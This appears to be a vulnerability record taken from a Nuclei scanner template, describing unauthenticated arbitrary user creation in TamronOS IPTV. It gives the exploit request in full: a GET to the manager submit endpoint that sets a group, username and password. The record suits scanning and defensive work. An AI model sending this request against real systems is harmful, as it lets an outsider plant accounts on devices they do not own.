# Vulnerability: TamronOS IPTV - Arbitrary User Creation
**Classification:** TAMRONOS
**Source:** Nuclei Template (`tamronos-user-creation.yaml`)

## Description
Unathenticated attackers can create multiple users in TamronOS IPTV.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/manager/submit?group=1&username={{username}}&password={{password}}
```

